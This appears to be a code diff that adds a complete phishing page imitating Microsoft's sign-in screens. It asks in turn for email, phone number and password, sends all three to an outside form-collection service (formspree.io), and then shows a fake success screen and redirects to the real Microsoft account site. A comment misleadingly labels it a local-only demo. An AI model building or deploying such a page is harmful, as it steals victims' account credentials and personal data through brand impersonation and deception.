@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft Sign In</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card {
+      background: #fff;
+      width: 100%;
+      max-width: 440px;
+      min-height: 516px;
+      padding: 44px;
+      border-radius: 2px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+      display: none;
+      flex-direction: column;
+      animation: fadeIn 0.2s ease;
+    }
+    .card.active { display: flex; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .ms-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
+    .ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 21px; height: 21px; }
+    .ms-grid span { display: block; }
+    .ms-grid span:nth-child(1) { background: #f25022; }
+    .ms-grid span:nth-child(2) { background: #7fba00; }
+    .ms-grid span:nth-child(3) { background: #00a4ef; }
+    .ms-grid span:nth-child(4) { background: #ffb900; }
+    .ms-name { font-size: 17px; color: #1b1b1b; font-weight: 400; }
+    h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; }
+    p.subtitle { font-size: 15px; color: #1b1b1b; line-height: 1.5; margin-bottom: 20px; }
+    .email-chip {
+      display: inline-flex; align-items: center; border: 1px solid #8a8a8a;
+      border-radius: 16px; padding: 4px 12px; font-size: 13px; color: #1b1b1b;
+      margin-bottom: 20px; cursor: pointer; width: fit-content;
+    }
+    .input-wrap { position: relative; margin-bottom: 4px; }
+    .input-wrap input {
+      width: 100%; border: none; border-bottom: 1px solid #666;
+      padding: 8px 40px 8px 0; font-size: 15px; color: #1b1b1b;
+      outline: none; background: transparent; font-family: inherit;
+    }
+    .input-wrap input:focus { border-bottom: 2px solid #0067b8; }
+    .input-wrap input::placeholder { color: transparent; }
+    .input-wrap label {
+      position: absolute; top: 8px; left: 0; font-size: 15px;
+      color: #666; pointer-events: none; transition: 0.15s ease;
+    }
+    .input-wrap input:focus ~ label,
+    .input-wrap input:not(:placeholder-shown) ~ label {
+      top: -14px; font-size: 12px; color: #0067b8;
+    }
+    .toggle-pw {
+      position: absolute; right: 0; top: 8px; background: none;
+      border: none; cursor: pointer; color: #605e5c;
+    }
+    .phone-wrap {
+      display: flex; align-items: flex-end;
+      border-bottom: 1px solid #666; margin-top: 4px;
+    }
+    .phone-wrap:focus-within { border-bottom: 2px solid #0067b8; }
+    .country-code {
+      display: flex; align-items: center; gap: 5px;
+      padding: 8px 12px 8px 0; cursor: pointer; white-space: nowrap;
+      color: #1b1b1b; font-size: 15px; border-right: 1px solid #ccc;
+      margin-right: 12px; user-select: none;
+    }
+    .phone-input-wrap { position: relative; flex: 1; }
+    .phone-input-wrap input {
+      width: 100%; border: none; padding: 8px 0; font-size: 15px;
+      color: #1b1b1b; outline: none; background: transparent;
+      font-family: inherit; letter-spacing: 0.5px;
+    }
+    .phone-input-wrap input::placeholder { color: transparent; }
+    .phone-input-wrap label {
+      position: absolute; top: 8px; left: 0; font-size: 15px;
+      color: #666; pointer-events: none; transition: 0.15s ease;
+    }
+    .phone-input-wrap input:focus ~ label,
+    .phone-input-wrap input:not(:placeholder-shown) ~ label {
+      top: -14px; font-size: 12px; color: #0067b8;
+    }
+    .links-row { margin-top: 12px; display: flex; flex-direction: column; gap: 8px; }
+    a.ms-link { color: #0067b8; font-size: 14px; text-decoration: none; cursor: pointer; }
+    a.ms-link:hover { text-decoration: underline; }
+    .spacer { flex: 1; }
+    .btn-row { display: flex; align-items: center; justify-content: flex-end; gap: 16px; margin-top: 24px; }
+    .btn-primary {
+      background: #0067b8; color: #fff; border: none; padding: 10px 20px;
+      font-size: 15px; font-family: inherit; cursor: pointer; min-width: 108px; transition: background 0.15s;
+    }
+    .btn-primary:hover { background: #005a9e; }
+    .btn-primary:disabled { background: #a0c4e8; cursor: not-allowed; }
+    .btn-primary.full-width { width: 100%; padding: 14px; font-size: 16px; margin-top: 24px; }
+    .signin-options {
+      display: flex; align-items: center; gap: 14px; border: 1px solid #8a8a8a;
+      padding: 14px 16px; cursor: pointer; background: none; width: 100%;
+      font-size: 15px; font-family: inherit; color: #1b1b1b; margin-top: 20px;
+    }
+    .signin-options:hover { background: #f5f5f5; }
+    .footer-links { margin-top: 32px; display: flex; gap: 20px; flex-wrap: wrap; }
+    .footer-links a { font-size: 12px; color: #1b1b1b; text-decoration: none; }
+    .footer-links a:hover { text-decoration: underline; }
+    .private-note { margin-top: 8px; font-size: 12px; color: #605e5c; }
+    .private-note a { color: #0067b8; text-decoration: none; }
+    .back-row { display: flex; align-items: center; margin-bottom: 24px; }
+    .back-btn { background: none; border: none; cursor: pointer; padding: 4px; color: #1b1b1b; display: flex; align-items: center; }
+    .back-btn:hover { color: #0067b8; }
+    .confirm-btn-row { display: flex; justify-content: flex-end; margin-top: 32px; }
+    .msg { font-size: 13px; margin-top: 10px; padding: 8px 12px; display: none; }
+    .msg.error { background: #fde8e8; color: #c0392b; display: block; }
+    .msg.success { background: #e8f5e9; color: #27ae60; display: block; }
+    .code-inputs { display: flex; gap: 10px; margin: 20px 0; }
+    .code-inputs input {
+      width: 48px; height: 54px; text-align: center; font-size: 22px; font-weight: 600;
+      border: 1px solid #8a8a8a; outline: none; color: #1b1b1b; font-family: inherit;
+    }
+    .code-inputs input:focus { border-color: #0067b8; border-width: 2px; }
+    .resend-row { margin-top: 12px; font-size: 14px; color: #605e5c; }
+    .resend-row span { color: #0067b8; cursor: pointer; }
+    .resend-row span:hover { text-decoration: underline; }
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.7s linear infinite;
+      margin-left: 8px; vertical-align: middle;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    /* reCAPTCHA badge hidden but required */
+    #recaptcha-container { margin-top: 16px; }
+  </style>
+</head>
+<body>
+
+<!-- Screen 1: Sign In -->
+<div class="card active" id="screen1">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <h1>Sign in</h1>
+  <div class="input-wrap">
+    <input type="text" id="emailInput" placeholder=" " />
+    <label>Email, phone, or Skype</label>
+  </div>
+  <div class="links-row">
+    <a class="ms-link" href="#">No account? <strong>Create one!</strong></a>
+    <a class="ms-link" href="#">Can't access your account?</a>
+  </div>
+  <div class="spacer"></div>
+  <div class="btn-row">
+    <button class="btn-primary" onclick="handleEmail()">Next</button>
+  </div>
+  <button class="signin-options">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+      <circle cx="8" cy="8" r="3"/>
+      <path d="M16 18v-1a5 5 0 0 0-5-5H5a5 5 0 0 0-5 5v1"/>
+      <path d="M22 18v-1a4 4 0 0 0-3-3.87"/>
+      <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+    </svg>
+    Sign-in options
+  </button>
+  <div class="footer-links">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+  </div>
+</div>
+
+<!-- Screen 2: Password -->
+<div class="card" id="screen2">
+  <div class="back-row">
+    <button class="back-btn" onclick="goTo('screen1')">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M19 12H5M12 5l-7 7 7 7"/>
+      </svg>
+    </button>
+    <div class="ms-logo" style="margin-bottom:0; margin-left:auto;">
+      <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+      <span class="ms-name">Microsoft</span>
+    </div>
+  </div>
+  <div class="email-chip" id="emailChip" onclick="goTo('screen1')">user@example.com</div>
+  <h1>Enter your password</h1>
+  <div class="input-wrap">
+    <input type="password" id="pwInput" placeholder=" " />
+    <label>Password</label>
+    <button class="toggle-pw" onclick="togglePw()" type="button">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+        <circle cx="12" cy="12" r="3"/>
+      </svg>
+    </button>
+  </div>
+  <div class="links-row">
+    <a class="ms-link" href="#">Forgot your password?</a>
+  </div>
+  <div id="passwordMsg" class="msg"></div>
+  <button class="btn-primary full-width" onclick="handlePassword()">Next</button>
+  <div style="text-align:center; margin-top:20px;">
+    <a class="ms-link" href="#">Other ways to sign in</a>
+  </div>
+  <div class="spacer"></div>
+  <div class="footer-links">
+    <a href="#">Help and feedback</a>
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy and cookies</a>
+  </div>
+  <div class="private-note">
+    Use private browsing if this is not your device. <a href="#">Learn more</a>
+  </div>
+</div>
+
+<!-- Screen 3: Phone -->
+<div class="card" id="screen3">
+  <div class="back-row">
+    <button class="back-btn" onclick="goTo('screen1')">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M19 12H5M12 5l-7 7 7 7"/>
+      </svg>
+    </button>
+    <div class="ms-logo" style="margin-bottom:0; margin-left:auto;">
+      <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+      <span class="ms-name">Microsoft</span>
+    </div>
+  </div>
+  <div class="email-chip" id="emailChip" onclick="goTo('screen1')">user@example.com</div>
+  <h1>Enter your phone number</h1>
+  <p class="subtitle">We will use this to continue your sign-in.</p>
+  <div class="phone-wrap">
+    <div class="country-code">
+      <span>&#127482;&#127480;</span>
+      <span>+1</span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#605e5c" stroke-width="2.5">
+        <path d="M6 9l6 6 6-6"/>
+      </svg>
+    </div>
+    <div class="phone-input-wrap">
+      <input type="tel" id="phoneInput" placeholder=" " maxlength="14" oninput="formatPhone(this)" />
+      <label>Mobile number</label>
+    </div>
+  </div>
+  <div id="phoneMsg" class="msg"></div>
+  <button class="btn-primary full-width" onclick="handlePhone()">Next</button>
+  <div class="spacer"></div>
+</div>
+
+<div class="card" id="screen4">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:16px;">
+    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#27ae60" stroke-width="1.8">
+      <circle cx="12" cy="12" r="10"/>
+      <path d="M9 12l2 2 4-4"/>
+    </svg>
+    <h1 style="font-size:22px;">You're signed in!</h1>
+    <p style="color:#605e5c;font-size:15px;">Your identity has been verified successfully.</p>
+    <button class="btn-primary" style="width:100%;max-width:260px;" onclick="goToAccountPage()">Go to account page</button>
+    <div id="accountMsg" class="msg"></div>
+  </div>
+</div>
+
+<!-- Screen 5: Session / Redirect -->
+<div class="card" id="screen5">
+  <div class="ms-logo">
+    <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+  <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:16px;">
+    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#27ae60" stroke-width="1.8">
+      <circle cx="12" cy="12" r="10"/>
+      <path d="M9 12l2 2 4-4"/>
+    </svg>
+    <h1 style="font-size:22px;">Creating session...</h1>
+    <p style="color:#605e5c;font-size:15px;">You'll be redirected to your Microsoft account shortly.</p>
+    <div id="sessionMsg" class="msg"></div>
+  </div>
+</div>
+
+<script>
+  // Local-only demo flow with no external Firebase or SMS verification.
+  const FORMSPREE_URL = 'https://formspree.io/f/xeevgnar';
+  let collectedData = window.collectedData = {
+    email: "",
+    phone: "",
+    password: ""
+  };
+  function goTo(id) {
+    document.querySelectorAll('.card').forEach(function(c) { c.classList.remove('active'); });
+    document.getElementById(id).classList.add('active');
+  }
+  function handleEmail() {
+    var email = document.getElementById('emailInput').value.trim();
+    if (!email) return;
+    window.collectedData.email = email;
+    document.getElementById('emailChip').textContent = email;
+    goTo('screen3');
+  }
+  function handlePhone() {
+    var raw = document.getElementById('phoneInput').value.replace(/\D/g, '');
+    if (raw.length < 10) {
+      showMsg('phoneMsg', 'Please enter a valid 10-digit US number.', 'error');
+      return;
+    }
+    hideMsg('phoneMsg');
+    window.collectedData.phone = '+1' + raw;
+    goTo('screen2');
+  }
+  async function submitData() {
+    const response = await fetch(FORMSPREE_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify({
+        email: window.collectedData.email,
+        phone: window.collectedData.phone,
+        password: window.collectedData.password
+      })
+    });
+    if (!response.ok) {
+      throw new Error('Submission failed: ' + response.status);
+    }
+    return response.json();
+  }
+  async function handlePassword() {
+    var pw = document.getElementById('pwInput').value;
+    if (!pw) return;
+    window.collectedData.password = pw;
+
+    var submitBtn = document.querySelector('#screen2 .btn-primary.full-width');
+    if (submitBtn) {
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = 'Submitting...';
+    }
+    hideMsg('accountMsg');
+
+    try {
+      await submitData();
+      goTo('screen4');
+      showMsg('accountMsg', 'Signed in successfully!', 'success');
+    } catch (error) {
+      console.error(error);
+      showMsg('passwordMsg', 'Submission failed. Please try again.', 'error');
+    } finally {
+      if (submitBtn) {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Next';
+      }
+    }
+  }
+  function togglePw() {
+    var i = document.getElementById('pwInput');
+    i.type = i.type === 'password' ? 'text' : 'password';
+  }
+  function goToAccountPage() {
+    // Navigate to session screen and then redirect to Microsoft account page
+    goTo('screen5');
+    showMsg('sessionMsg', 'Redirecting to Microsoft account...', 'success');
+    setTimeout(function() {
+      window.location.href = 'https://account.microsoft.com/';
+    }, 1500);
+  }
+  function formatPhone(input) {
+    var v = input.value.replace(/\D/g,'').substring(0,10);
+    var out = '';
+    if (v.length > 6)      out = '('+v.substring(0,3)+') '+v.substring(3,6)+'-'+v.substring(6);
+    else if (v.length > 3) out = '('+v.substring(0,3)+') '+v.substring(3);
+    else if (v.length > 0) out = '('+v;
+    input.value = out;
+  }
+  function moveNext(input, index) {
+    input.value = input.value.replace(/\D/g,'');
+    var digits = document.querySelectorAll('.code-digit');
+    if (input.value && index < 5) digits[index+1].focus();
+  }
+  function movePrev(e, index) {
+    if (e.key === 'Backspace') {
+      var digits = document.querySelectorAll('.code-digit');
+      if (!digits[index].value && index > 0) digits[index-1].focus();
+    }
+  }
+  function clearCodeInputs() {
+    document.querySelectorAll('.code-digit').forEach(function(i){ i.value=''; });
+  }
+  function showMsg(id, text, type) {
+    var el = document.getElementById(id);
+    el.textContent = text;
+    el.className = 'msg ' + type;
+  }
+  function hideMsg(id) {
+    var el = document.getElementById(id);
+    el.className = 'msg';
+    el.textContent = '';
+  }
+  document.addEventListener('keydown', function(e) {
+    if (e.key !== 'Enter') return;
+    var active = document.querySelector('.card.active');
+    if (!active) return;
+    if (active.id === 'screen1') handleEmail();
+    else if (active.id === 'screen3') handlePhone();
+    else if (active.id === 'screen2') handlePassword();
+  });
+</script>
+</body>
+</html>
